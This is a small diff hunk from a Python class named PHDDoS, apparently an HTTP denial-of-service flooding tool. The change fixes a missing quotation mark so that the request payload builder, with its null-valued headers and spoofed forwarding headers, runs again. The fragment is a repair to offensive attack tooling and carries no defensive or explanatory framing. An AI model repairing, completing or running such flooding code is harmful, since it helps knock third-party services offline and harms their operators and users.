@@ -386,7 +386,7 @@ class PHDDoS:
 		payload += "Accept-Language: null\r\n"
 		payload += "Accept-Encoding: null\r\n"
 		payload += "Accept: null\r\n"
-		payload += "User-Agent: " + PHDDoS.getUA() + \r\n"
+		payload += "User-Agent: " + PHDDoS.getUA() + "\r\n"
 		payload += "X-Forwarded-Proto: Http\r\n"
 		payload += "X-Forwarded-Host: null, null\r\n"
 		payload += "Via: null\r\n"
